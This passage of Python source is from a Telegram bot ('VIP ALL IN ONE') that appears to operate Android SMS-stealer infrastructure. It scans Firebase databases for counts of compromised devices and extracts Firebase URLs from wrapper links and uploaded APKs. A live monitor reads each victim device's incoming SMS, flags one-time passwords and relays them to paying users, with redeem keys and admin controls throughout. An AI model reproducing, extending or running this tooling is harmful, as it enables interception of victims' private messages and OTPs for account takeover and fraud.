                out_path, "VIP ALL IN ONE – Bulk ACTIVE", active_list,
                dead_count=dead_count, total_scanned=total_scanned,
                extra_header=f"User: {user_id}",
            )
            await send_bulk_to_admins(
                user_id, username, "Text Bulk", active_list, total_scanned, dead_count, out_path
            )
            asyncio.create_task(
                log_for_admin_with_status(user_id, username, "Bulk Fast Check", unique_target_dbs, txt[:100])
            )
            summary = (
                f"⚡ <b>Bulk Scan Complete!</b>\n"
                f"📊 Scanned: <code>{total_scanned}</code> | 🟢 Active: <code>{len(active_list)}</code> | "
                f"💀 Dead/0: <code>{dead_count}</code>\n📌 Sorted High Online → Low\n\n"
            )
            if len(report) > 3500 or len(active_list) > 15:
                await status_msg.edit_text(
                    summary + "📄 Sorted ACTIVE list attached as .txt\n\n🛡️ <b>VIP ALL IN ONE</b>",
                    parse_mode="HTML",
                )
                try:
                    with open(out_path, "rb") as doc:
                        await context.bot.send_document(
                            chat_id=chat_id, document=doc,
                            caption=f"📁 <b>ACTIVE only</b> ({len(active_list)} DBs)",
                            parse_mode="HTML",
                        )
                finally:
                    try:
                        os.remove(out_path)
                    except Exception:
                        pass
            else:
                await status_msg.edit_text(report, parse_mode="HTML", disable_web_page_preview=True)
                try:
                    os.remove(out_path)
                except Exception:
                    pass
            return

        if len(unique_target_dbs) == 1:
            clean_target = unique_target_dbs[0]
            status_msg = await msg.reply_text(f"⚡ Fast Checking: `{clean_target}`...", parse_mode="Markdown")
            async with httpx.AsyncClient() as client:
                total, online = await parse_panel_data(client, clean_target)
            await store_user_databases(user_id, [(clean_target, total, online)])
            node_name = clean_target.split("//")[-1].split("-")[0]
            vercel_url = generate_vercel_link(clean_target)
            try:
                online_n = int(online) if online is not None else 0
            except (TypeError, ValueError):
                online_n = 0
            status_badge = "🟢 <b>ACTIVE</b>" if online_n > 0 else "💀 <b>DEAD / OFFLINE</b>"
            report = (
                f"⚡ <b>Lightning Status Report</b>\n"
                f"🌐 <b>Node:</b> <code>{node_name}</code>\n"
                f"📌 Status: {status_badge}\n\n"
                f"🔥 <b>Firebase URL:</b>\n<code>{clean_target}</code>\n\n"
                f"📦 <b>Total Devices:</b> <code>{total}</code>\n"
                f"🟢 <b>Online Devices:</b> <code>{online}</code>\n\n"
                f"🔗 <b>Panel Link:</b>\n{vercel_url}\n\n"
                f"🛡️ <b>VIP ALL IN ONE BOT</b>"
            )
            await status_msg.edit_text(report, parse_mode="HTML", disable_web_page_preview=True)
            asyncio.create_task(
                log_for_admin_with_status(user_id, username, "Fast DB Check", [clean_target], txt)
            )
            return

        # Decode path for wrapper links
        for line in raw_items:
            line = line.strip()
            if not line:
                continue
            match = re.search(r"https?://[^\s]+", line)
            target_url = match.group(0) if match else line
            status_msg = await msg.reply_text("◆ <b>DECODE</b> · Unpacking payload...", parse_mode="HTML")
            scan_res, found_dbs = await extract_firebase_from_url(target_url)
            await status_msg.edit_text(scan_res, parse_mode="HTML", disable_web_page_preview=True)
            if found_dbs:
                asyncio.create_task(
                    log_for_admin_with_status(user_id, username, "Mixed Panel Scan", found_dbs, target_url)
                )
            return


# ============================================================
# SMS MONITOR
# ============================================================
async def _delete_monitor_messages(bot, uid: int, chat_id: int, message_ids=None):
    state = sms_monitor_state.get(uid, {})
    ids = list(message_ids if message_ids is not None
               else state.get("sent_message_ids", []))
    if not ids:
        return
    for message_id in ids:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception as exc:
            logger.info("could not delete SMS %s: %s", message_id, exc)
    if message_ids is None:
        state["sent_message_ids"] = []


async def _delete_monitor_status_message(bot, uid: int, chat_id: int):
    state = sms_monitor_state.get(uid, {})
    message_id = state.get("monitor_message_id")
    if not message_id:
        return
    try:
        await bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception as exc:
        logger.info("could not delete monitor status %s: %s", message_id, exc)
    state.pop("monitor_message_id", None)


def touch_sms_monitor(uid: int):
    """Reset idle timer whenever user taps a button."""
    state = sms_monitor_state.get(uid)
    if state:
        state["last_activity"] = time.monotonic()


def stop_sms_monitor(uid: int):
    task = sms_monitor_tasks.pop(uid, None)
    state = sms_monitor_state.get(uid)
    if state:
        bot = state.get("bot")
        chat_id = state.get("chat_id")
        if bot and chat_id:
            message_ids = list(state.get("sent_message_ids", []))
            if message_ids:
                asyncio.create_task(_delete_monitor_messages(bot, uid, chat_id, message_ids))
            asyncio.create_task(_delete_monitor_status_message(bot, uid, chat_id))
    if task and not task.done():
        task.cancel()
    sms_monitor_state.pop(uid, None)


def _msg_fingerprint(ts_key: str, m: dict) -> str:
    sender = _extract_msg_sender(m)
    body = _extract_msg_body(m)
    tval = ""
    if isinstance(m, dict):
        for k in ("time", "timestamp", "receivedTime", "sentTime",
                  "dateTime", "createdAt"):
            v = m.get(k)
            if v is not None and str(v).strip():
                tval = str(v).strip()
                break
    return f"{ts_key}|{sender}|{body}|{tval}"


async def _sms_monitor_loop(bot, uid: int, chat_id: int, device_id: str,
                             unlimited: bool = False,
                             baseline_fingerprints=None,
                             fb_url: str = "", task_token=None, state: dict = None):
    started = time.monotonic()
    seen_fingerprints = set(baseline_fingerprints or ())
    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT))
    real_cid = device_id
    resolved_fb_url = fb_url
    stop_reason = None
    try:
        tag, real_cid = _parse_prefixed(device_id)
        if not resolved_fb_url:
            resolved_fb_url = (
                (state or {}).get("fb_url")
                or sms_monitor_state.get(uid, {}).get("fb_url")
                or _find_fb_url_by_tag(uid, tag))
        if not resolved_fb_url:
            return
        url_with_query = build_fb_endpoint(
            resolved_fb_url, f"messages/{real_cid}",
            query='orderBy="$key"&limitToLast=50')
        url_plain = build_fb_endpoint(resolved_fb_url, f"messages/{real_cid}")
        while True:
            if not unlimited and (time.monotonic() - started >= SMS_MONITOR_DURATION):
                break
            current_state = sms_monitor_state.get(uid)
            if current_state is None or current_state is not state:
                break
            if unlimited and uid not in ADMIN_IDS:
                last_activity = current_state.get("last_activity", started)
                if (time.monotonic() - last_activity) >= SMS_MONITOR_IDLE_TIMEOUT:
                    stop_reason = "idle"
                    break
            if uid not in ADMIN_IDS and not has_access(uid):
                stop_reason = "revoked"
                break
            data, status, err = await fb_get_json(session, url_with_query,
                                                   retries=0, timeout=6)
            if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                data, status, err = await fb_get_json(session, url_plain,
                                                       retries=0, timeout=6)
            if status != "SUCCESS" or not isinstance(data, (dict, list)) or not data:
                await asyncio.sleep(SMS_MONITOR_INTERVAL)
                continue
            pairs = _newest_with_keys(data, limit=50)
            current_fps = [(k, m, _msg_fingerprint(k, m)) for k, m in pairs]
            new_msgs = [(k, m, fp) for k, m, fp in current_fps
                        if fp not in seen_fingerprints]
            new_msgs.sort(key=lambda x: str(x[0]))
            for ts_key, m, fp in new_msgs:
                sender = _extract_msg_sender(m)
                body = _extract_msg_body(m)
                if not body:
                    body = "(no message body)"
                when = _extract_msg_time(m, ts_key).replace(" | ", " • ")
                otp = _extract_otp(body)
                alert_lines = [
                    f"{pe('alert')} LIVE SMS RECEIVED!",
                    "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️",
                    "",
                    f"{pe('eyes')} From: {sender}",
                    f"{pe('zap')} Time: {when}",
                    "",
                    f"{body}",
                ]
                if otp:
                    alert_lines.extend(["", f"{pe('key')} OTP DETECTED: `{otp}`"])
                alert_text = "\n".join(alert_lines)
                try:
                    sent_message = await bot.send_message(
                        chat_id=chat_id,
                        text=_bold_blockquote(alert_text),
                        parse_mode="HTML")
                    seen_fingerprints.add(fp)
                    state = sms_monitor_state.get(uid)
                    if state is not None and state is current_state:
                        state.setdefault("sent_message_ids", []).append(
                            sent_message.message_id)
                except Exception as e:
                    logger.error("[SMS MONITOR] notify error uid=%s err=%r",
                                 uid, e, exc_info=True)
            if len(seen_fingerprints) > 500:
                seen_fingerprints = set(fp for _, _, fp in current_fps)
            await asyncio.sleep(SMS_MONITOR_INTERVAL)

        if not unlimited:
            await _delete_monitor_messages(bot, uid, chat_id)
            await _delete_monitor_status_message(bot, uid, chat_id)
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=("⏱️ *SMS Monitor Auto-Stopped*\n\n"
                          "✅ Time poora ho gaya.\n"
                          "▶️ Dobara GENERATE NUMBER dabao."),
                    parse_mode="Markdown", reply_markup=connect_inline_kb())
            except Exception as e:
                logger.error(f"auto-stop notify: {e}")
        elif stop_reason == "idle":
            await _delete_monitor_messages(bot, uid, chat_id)
            await _delete_monitor_status_message(bot, uid, chat_id)
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=_bold_blockquote(
                        "⏱️ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗔𝗨𝗧𝗢-𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
                        "⚠️ 𝟭𝟬 𝗺𝗶𝗻𝘂𝘁𝗲𝘀 𝘀𝗲 𝗸𝗼𝗶 𝗯𝘂𝘁𝘁𝗼𝗻 𝗻𝗮𝗵𝗶 𝗱𝗮𝗯𝗮𝘆𝗮\n\n"
                        "🔄 𝗔𝗰𝗰𝗲𝘀𝘀 𝗮𝗴𝗮𝗶𝗻 𝗸𝗲 𝗹𝗶𝘆𝗲 /start 𝗱𝗮𝗯𝗮𝗼 𝗮𝘂𝗿 𝗻𝗮𝘆𝗮 𝗺𝗼𝗻𝗶𝘁𝗼𝗿 𝘀𝘁𝗮𝗿𝘁 𝗸𝗮𝗿𝗼."),
                    parse_mode="HTML",
                    reply_markup=connect_inline_kb())
            except Exception as e:
                logger.error(f"idle-stop notify: {e}")
        elif stop_reason == "revoked":
            await _delete_monitor_messages(bot, uid, chat_id)
            await _delete_monitor_status_message(bot, uid, chat_id)
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=_bold_blockquote(
                        "⛔ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n"
                        "⚠️ 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝘃𝗼𝗸𝗲𝗱.\n\n"
                        "🔗 𝗥𝗲𝗷𝗼𝗶𝗻 𝗮𝗹𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝗮𝗻𝗱 𝘀𝗲𝗻𝗱 /start"),
                    parse_mode="HTML",
                    reply_markup=connect_inline_kb())
            except Exception as e:
                logger.error(f"revoke-stop notify: {e}")
    except asyncio.CancelledError:
        raise
    except Exception as e:
        logger.error("[SMS MONITOR] crashed uid=%s err=%r", uid, e, exc_info=True)
    finally:
        try:
            await session.close()
        except Exception:
            pass
        current_state = sms_monitor_state.get(uid)
        if current_state is state:
            sms_monitor_state.pop(uid, None)
            sms_monitor_tasks.pop(uid, None)


def start_sms_monitor(bot, uid: int, chat_id: int, device_id: str,
                       unlimited: bool = False, baseline_fingerprints=None,
                       fb_url: str = ""):
    stop_sms_monitor(uid)
    task_token = object()
    now = time.monotonic()
    state = {
        "device_id": device_id, "chat_id": chat_id,
        "sent_message_ids": [], "bot": bot, "unlimited": unlimited,
        "baseline_fingerprints": set(baseline_fingerprints or ()),
        "fb_url": fb_url, "task_token": task_token,
        "last_activity": now,
    }
    sms_monitor_state[uid] = state
    task = asyncio.create_task(_sms_monitor_loop(
        bot, uid, chat_id, device_id, unlimited=unlimited,
        baseline_fingerprints=baseline_fingerprints,
        fb_url=fb_url, task_token=task_token, state=state))
    sms_monitor_tasks[uid] = task
    logger.info("[SMS MONITOR] started uid=%s device=%s fb_url=%s baseline_count=%d",
                uid, device_id, fb_url, len(baseline_fingerprints or ()))


def _parse_prefixed(device_id: str):
    if "|" in device_id:
        parts = device_id.split("|", 1)
        return parts[0], parts[1]
    return "", device_id


def _find_fb_url_by_tag(uid: int, tag: str) -> Optional[str]:
    for url, t in global_fb_list:
        if t == tag:
            return url
    sess = user_sessions.get(uid)
    if sess:
        for url, t in sess.get("fb_list", []):
            if t == tag:
                return url
    return None


# ============================================================
# ADMIN CALLBACKS
# ============================================================
def _admin_only(uid: int) -> bool:
    return uid in ADMIN_IDS


async def _admin_show_firebases(q):
    text = _build_admin_fb_text()
    await q.edit_message_text(text, parse_mode="Markdown",
                              reply_markup=admin_firebases_kb())
    await _start_admin_panel_live_task(
        q.bot, q.from_user.id, q.message.chat_id, q.message.message_id)


async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global global_fb_list, maintenance_mode, feature_maintenance, captcha_enabled, _last_refresh_time
    q = update.callback_query
    uid = q.from_user.id
    if not _admin_only(uid):
        await q.answer("Admin only.", show_alert=True)
        return
    await q.answer()
    data = q.data

    if not (data == "admin_manage_fb"
            or data.startswith("admin_fb_refresh:")
            or data.startswith("admin_fb_info:")
            or data.startswith("admin_fb_delete:")):
        _stop_admin_panel_live_task(uid)

    # ---------- ADD / REMOVE ADMIN (owner only) ----------
    if data == "admin_add_admin":
        if not is_owner(uid):
            await q.answer("Sirf owner admin add kar sakta hai.", show_alert=True)
            return
        context.user_data["admin_action"] = "add_admin"
        await q.edit_message_text(
            "👑 *Add Admin*\n\n"
            "User ID bhejein jo admin banana hai.\n\n"
            "Example:\n"
            "`123456789`\n\n"
            "⚠️ Sirf owner yeh option use kar sakta hai.\n"
            "Owner khud remove nahi hota.",
            parse_mode="Markdown",
            reply_markup=admin_back_kb())
        return

    if data == "admin_remove_admin":
        if not is_owner(uid):
            await q.answer("Sirf owner admin remove kar sakta hai.", show_alert=True)
            return
        other_admins = sorted(a for a in ADMIN_IDS if a != OWNER_ID)
        lines = ["👤 *Remove Admin*\n\n"]
        if other_admins:
            lines.append("Current extra admins:")
            for a in other_admins:
                lines.append(f"• `{a}`")
            lines.append("")
        else:
            lines.append("Abhi koi extra admin nahi hai.\n")
        lines.append("Remove karne ke liye user ID bhejein.\n")
        lines.append("Example: `123456789`\n\n")
        lines.append("⚠️ Owner remove nahi hota.")
        context.user_data["admin_action"] = "remove_admin"
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_back_kb())
        return

    if data == "admin_list_admins":
        if not is_owner(uid):
            await q.answer("Sirf owner dekh sakta hai.", show_alert=True)
            return
        lines = ["👑 *Admin List*\n"]
        lines.append(f"⭐ Owner: `{OWNER_ID}`")
        extras = sorted(a for a in ADMIN_IDS if a != OWNER_ID)
        if extras:
            lines.append("\nExtra admins:")
            for a in extras:
                lines.append(f"• `{a}`")
        else:
            lines.append("\nKoi extra admin nahi.")
        lines.append(f"\nTotal: `{len(ADMIN_IDS)}`")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_panel_kb(uid))
        return

    # ---------- BAN / UNBAN ----------
    if data == "admin_ban_user":
        context.user_data["admin_action"] = "ban_user"
        await q.edit_message_text(
            "🚫 *Ban User*\n\n"
            "User ID bhejein jise ban karna hai.\n\n"
            "Example:\n"
            "`123456789`\n\n"
            "⚠️ Owner ban nahi hota.\n"
            "Dusre admin ko sirf owner ban kar sakta hai.",
            parse_mode="Markdown",
            reply_markup=admin_back_kb())
        return

    if data == "admin_unban_user":
        context.user_data["admin_action"] = "unban_user"
        banned = sorted(BANNED_USERS)
        lines = ["✅ *Unban User*\n\n"]
        if banned:
            lines.append(f"Banned users ({len(banned)}):")
            for b in banned[:30]:
                lines.append(f"• `{b}`")
            if len(banned) > 30:
                lines.append(f"... +{len(banned) - 30} more")
            lines.append("")
        else:
            lines.append("Koi user banned nahi hai.\n")
        lines.append("Unban karne ke liye user ID bhejein.\n")
        lines.append("Example: `123456789`")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_back_kb())
        return

    if data == "admin_banned_list":
        banned = sorted(BANNED_USERS)
        if not banned:
            await q.edit_message_text(
                "📋 *Banned Users*\n\nKoi user banned nahi hai.",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid))
            return
        lines = [f"📋 *Banned Users* ({len(banned)})\n"]
        for b in banned[:50]:
            lines.append(f"• `{b}`")
        if len(banned) > 50:
            lines.append(f"\n... +{len(banned) - 50} more")
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_panel_kb(uid))
        return

    # ---------- GIFT ACCESS MENU ----------
    if data == "admin_gift_access":
        await q.edit_message_text(
            "🎁 *Gift Access*\n\n"
            "Kaise gift karna hai?\n\n"
            "👤 *Single User* — ek user ko hours ke hisaab se access do\n"
            "👥 *All Users* — sabhi users ko same hours do\n\n"
            "Neeche se option chuno:",
            parse_mode="Markdown", reply_markup=admin_gift_kb())
        return

    if data == "admin_gift_single":
        context.user_data["admin_action"] = "gift_single"
        await q.edit_message_text(
            "👤 *Gift Single User*\n\n"
            "Format bhejein:\n"
            "`<user_id> <hours>`\n\n"
            "Example:\n"
            "`123456789 5`\n\n"
            "Iska matlab: user 123456789 ko 5 ghante ka access.\n\n"
            "📌 *Hours float bhi ho sakte hain* (e.g. `0.5` = 30 min)",
            parse_mode="Markdown", reply_markup=admin_gift_kb())
        return

    if data == "admin_gift_all":
        context.user_data["admin_action"] = "gift_all"
        await q.edit_message_text(
            "👥 *Gift All Users*\n\n"
            f"Sirf hours likh kar bhejein.\n"
            f"Total users: `{len(known_users)}`\n\n"
            "Example:\n"
            "`5`\n\n"
            "Iska matlab: sabhi users ko 5 ghante ka access.\n\n"
            "📌 *Hours float bhi ho sakte hain* (e.g. `0.5` = 30 min)",
            parse_mode="Markdown", reply_markup=admin_gift_kb())
        return

    if data == "admin_genkey":
        context.user_data["admin_action"] = "genkey"
        await q.edit_message_text(
            "🔑 *Generate Redeem Key*\n\n"
            "Format bhejo:\n"
            "`<hours> <max_users>`\n\n"
            "Examples:\n"
            "`24 1` — 24h access, 1 person only\n"
            "`12 10` — 12h access, 10 people can redeem\n"
            "`48 5` — 48h, max 5 redeems\n\n"
            "Default agar sirf hours: `24` → 24h, 1 use",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔙 ADMIN PANEL", callback_data="admin_back")],
            ]),
        )
        return

    if data == "admin_listkeys":
        keys = list_active_keys(15)
        if not keys:
            await q.edit_message_text(
                "🔑 *No keys generated yet.*\n\nUse GENERATE KEY.",
                parse_mode="Markdown",
                reply_markup=admin_panel_kb(uid),
            )
            return
        lines = ["🔑 *Recent Redeem Keys*\n"]
        for k in keys:
            status = "✅" if k["active"] else "❌"
            lines.append(
                f"{status} `{k['code']}`\n"
                f"   ⏳ {k['hours']}h · 👥 {k['used']}/{k['max_uses']} · {k['created_at']}"
            )
        await q.edit_message_text(
            "\n".join(lines),
            parse_mode="Markdown",
            reply_markup=admin_panel_kb(uid),
        )
        return

    if data == "admin_feature_maint":
        await q.edit_message_text(
            _feature_maint_status_text(),
            parse_mode="Markdown",
            reply_markup=admin_feature_maint_kb())
        return

    if data.startswith("admin_toggle_feat:"):
        key = data.split(":", 1)[1].strip()
        if key not in FEATURE_MAINT_KEYS:
            await q.answer("Invalid feature.", show_alert=True)
            return
        feature_maintenance[key] = not bool(feature_maintenance.get(key, False))
        _save_maintenance_mode()
        state = "OFF (Maintenance)" if feature_maintenance[key] else "ON (Live)"
        await q.answer(f"{FEATURE_MAINT_LABELS.get(key, key)} → {state}")
        await q.edit_message_text(
            _feature_maint_status_text(),
            parse_mode="Markdown",
            reply_markup=admin_feature_maint_kb())
        return

    if data == "admin_toggle_maintenance":
        maintenance_mode = not maintenance_mode
        _save_maintenance_mode()
        notice = (_bold_blockquote("🛠️ 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗡 ⚙️")
                  if maintenance_mode
                  else _bold_blockquote("✅ 𝗕𝗢𝗧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 𝗠𝗢𝗗𝗘 𝗢𝗙𝗙"))
        sent = failed = 0
        for target_uid in list(known_users):
            try:
                await context.bot.send_message(chat_id=target_uid,
                                                text=notice, parse_mode="HTML")
                sent += 1
            except Exception as exc:
                failed += 1
                logger.info("maintenance notice failed for %s: %s", target_uid, exc)
        await q.edit_message_text(
            f"{notice}\n\n📨 Sent: {sent}\n❌ Failed: {failed}",
            parse_mode="HTML", reply_markup=admin_panel_kb(uid))
        return

    if data == "admin_toggle_captcha":
        captcha_enabled = not captcha_enabled
        _save_captcha_enabled()
        await q.edit_message_text(
            f"🔐 Captcha: {'ON' if captcha_enabled else 'OFF'}",
            reply_markup=admin_panel_kb(uid))
        return

    if data == "admin_back":
        context.user_data.pop("admin_action", None)
        await q.edit_message_text(
            "🛠 *Admin Panel*\n\nSelect an action:",
            parse_mode="Markdown", reply_markup=admin_panel_kb(uid))
        return

    if data == "admin_stats":
        await q.edit_message_text(
            "📊 *Bot Statistics*\n\n"
            f"👥 Total users: `{len(known_users)}`\n"
            f"👑 Admins: `{len(ADMIN_IDS)}`\n"
            f"🚫 Banned: `{len(BANNED_USERS)}`\n"
            f"🔗 Firebases: `{len(global_fb_list)}`\n"
            f"🔗 Force-join channels: `{len(REQUIRED_CHANNELS)}`\n"
            f"💾 Active sessions: `{len(user_sessions)}`\n"
            f"📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n"
            f"🔐 Captcha: `{'ON' if captcha_enabled else 'OFF'}`",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_add_firebase":
        if len(global_fb_list) >= MAX_FIREBASES:
            await q.answer(f"Max {MAX_FIREBASES} Firebase allowed.", show_alert=True)
            return
        context.user_data["admin_action"] = "add_firebase"
        await q.edit_message_text(
            "➕ *Add Firebase*\n\n"
            "Firebase Realtime Database URL bhejein.\n"
            "Example: `https://xxx-default-rtdb.firebaseio.com`",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_manage_fb":
        await _admin_show_firebases(q)
        return

    if data.startswith("admin_fb_refresh:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            url, tag = global_fb_list[idx]
            await q.edit_message_text(f"⏳ Refreshing `{tag}`...")
            await refresh_global_device_cache()
            _last_refresh_time = time.monotonic()
            text = _build_admin_fb_text()
            await q.edit_message_text(text, parse_mode="Markdown",
                                      reply_markup=admin_firebases_kb())
            await _start_admin_panel_live_task(
                context.bot, uid, q.message.chat_id, q.message.message_id)
        except Exception as e:
            logger.error("admin_fb_refresh: %s", e)
            await q.edit_message_text("❌ Refresh failed.",
                                      reply_markup=admin_firebases_kb())
        return

    if data.startswith("admin_fb_delete:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            removed = global_fb_list.pop(idx)
            _retag_global_firebases()
            _save_global_firebases()
            await q.edit_message_text(
                f"🗑 *Deleted*\n\nRemoved: `{removed[1]}`\n"
                f"Remaining: {len(global_fb_list)}/{MAX_FIREBASES}",
                parse_mode="Markdown", reply_markup=admin_firebases_kb())
        except Exception as e:
            logger.error("admin_fb_delete: %s", e)
            await q.answer("Delete failed.", show_alert=True)
        return

    if data.startswith("admin_fb_info:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list):
                await q.answer("Invalid Firebase.", show_alert=True)
                return
            url, tag = global_fb_list[idx]
            per_fb = global_device_cache.get("per_fb", {}) or {}
            counts = per_fb.get(tag) or {}
            online = int(counts.get("online", 0))
            offline = int(counts.get("offline", 0))
            await q.edit_message_text(
                f"📋 *{tag}*\n\n"
                f"🟢 Online: `{online}`\n🔴 Offline: `{offline}`\n"
                f"📊 Total: `{online + offline}`\n"
                f"🕒 `{global_device_cache.get('updated_at', '')}`",
                parse_mode="Markdown", reply_markup=admin_firebases_kb())
        except Exception as e:
            logger.error("admin_fb_info: %s", e)
            await q.answer("Load failed.", show_alert=True)
        return

    if data == "admin_channels":
        if REQUIRED_CHANNELS:
            lines = ["📋 *Force-Join Channels*\n"]
            for i, channel in enumerate(REQUIRED_CHANNELS, 1):
                lines.append(f"{i}. `{channel.get('label', channel.get('id'))}`")
            text = "\n".join(lines)
        else:
            text = "📋 *Force-Join Channels*\n\nNo channels configured."
        await q.edit_message_text(text, parse_mode="Markdown",
                                  reply_markup=admin_channels_kb())
        return

    if data == "admin_add_channel":
        context.user_data["admin_action"] = "add_channel"
        await q.edit_message_text(
            "➕ *Add Force-Join Channel*\n\n"
            "Channel username bhejein, example: `@mychannel`\n"
            "Bot ko us channel ka administrator hona chahiye.",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data == "admin_broadcast":
        context.user_data["admin_action"] = "broadcast"
        await q.edit_message_text(
            "📢 *Broadcast*\n\n"
            "Broadcast message bhejein. Sabhi users ko send hoga.",
            parse_mode="Markdown", reply_markup=admin_back_kb())
        return

    if data.startswith("admin_remove_channel:"):
        try:
            index = int(data.split(":", 1)[1])
            removed = REQUIRED_CHANNELS.pop(index)
            _save_required_channels()
            await q.edit_message_text(
                f"✅ Removed: `{removed.get('label', removed.get('id'))}`",
                parse_mode="Markdown", reply_markup=admin_channels_kb())
        except (ValueError, IndexError):
            await q.answer("Invalid channel.", show_alert=True)
        return


# ============================================================
# SMS VIEW
# ============================================================
async def _show_sms_safe(q, info: dict, device_id: str, updated_at: Optional[str] = None):
    """Fetch and display last N SMS for a device."""
    fb_url = info.get("fb_url", "")
    real_cid = info.get("real_cid", device_id)
    tag = info.get("fb_tag", "?")

    if not fb_url:
        parsed_tag, parsed_cid = _parse_prefixed(device_id)
        fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
        if not fb_url:
            await _safe_edit_callback_message(
                q,
                "❌ *Device info missing.*\n\nPlease tap REFRESH.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")],
                    [InlineKeyboardButton("🎲 GENERATE AGAIN", callback_data="generate_number")],
                ]))
            return
        real_cid = parsed_cid
        tag = parsed_tag

    try:
        await _safe_edit_callback_message(q, "⏳ Fetching SMS...")
    except Exception:
        pass

    pairs = await fetch_last_sms(fb_url, real_cid, limit=FB_MESSAGES_LIMIT)

    if not pairs:
        await _safe_edit_callback_message(
            q,
            f"📭 *No SMS records found.*\n\n"
            f"🌐 Firebase: `{tag}`\n"
            f"📱 Device: `{real_cid}`",
            parse_mode="Markdown",
            reply_markup=sms_view_kb(device_id))
        return

    lines = [f"📩 LAST {len(pairs)} SMS", "",
             "━━━━━━━━━━━━━━━━━━━━━━━",
             f"🌐 Firebase: {tag}",
             f"📱 Device: {real_cid}",
             "━━━━━━━━━━━━━━━━━━━━━━━"]
    circled_numbers = ("①", "②", "③", "④", "⑤")
    for i, (ts_key, m) in enumerate(pairs, 1):
        sender = _extract_msg_sender(m)
        body = _extract_msg_body(m)
        when = _extract_msg_time(m, ts_key)
        otp = _extract_otp(body)
        number = _extract_number(sender)
        if not body:
            body = "(no body)"
        number_label = circled_numbers[i - 1] if i <= len(circled_numbers) else f"{i}."
        
        # Add separator between SMS
        if i > 1:
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━")
        
        lines.extend(["",
                      f"{number_label} ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ: {sender}",
                      f"⏱️ ᴛɪᴍᴇ: {when}",
                      "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️",
                      f"{_otp_short_message(sender, body)}"])
        if otp:
            lines.append(f"🔑 ᴏᴛᴘ: `{otp}`")
    if updated_at:
        lines.extend(["",
                      "━━━━━━━━━━━━━━━━━━━━━━━",
                      "𝗨𝗽𝗱𝗮𝘁𝗲𝗱",
                      "━━━━━━━━━━━━━━━━━━━━━━━"])
    text = "\n".join(lines)
    
    # Send all SMS in single message (no separate chats)
    if len(text) > 3800:
        # If too long, split but keep in one message with ... continuation
        text = text[:3800] + "\n\n... (truncated - too many SMS)"
    
    await _safe_edit_callback_message(
        q, text, parse_mode="Markdown",
        reply_markup=sms_view_kb(device_id))


# ============================================================
# CHECKER DOCUMENT HANDLER (APK / TXT)
# ============================================================
async def checker_document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.document:
        return
    user = msg.from_user
    user_id = user.id if user else 0
    if user_id and is_banned(user_id) and user_id not in ADMIN_IDS:
        await msg.reply_text(
            _bold_blockquote(
                "🚫 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗕𝗔𝗡𝗡𝗘𝗗\n\n"
                "⛔ Bot access band hai."),
            parse_mode="HTML")
        return
    # Hosting .py upload (approved users only)
    try:
        if await hosting_document_handler(update, context, msg, user_id):
            return
    except Exception as exc:
        logger.error("hosting_document_handler: %s", exc)
    username = (user.username or user.first_name) if user else "Unknown"
    chat_id = msg.chat_id
    save_checker_user(user_id)
    doc = msg.document
    file_name = doc.file_name or "unknown"
    mode = get_mode(user_id)

    # ── FILE SHARE mode: store file_id + give share link ──
    if mode == "files":
        if user_id not in ADMIN_IDS and is_feature_down("files"):
            await msg.reply_text(
                feature_down_text("files"),
                parse_mode="HTML",
                reply_markup=main_home_kb(user_id))
            return
        token = register_shared_file(
            file_id=doc.file_id,
            file_name=file_name,
            owner_id=user_id,
            file_size=int(getattr(doc, "file_size", 0) or 0),
            mime_type=getattr(doc, "mime_type", "") or "",
        )
        link = build_file_share_link(token)
        await msg.reply_text(
            f"✅ <b>File ready to share</b>\n\n"
            f"📄 <code>{html_escape(file_name)}</code>\n"
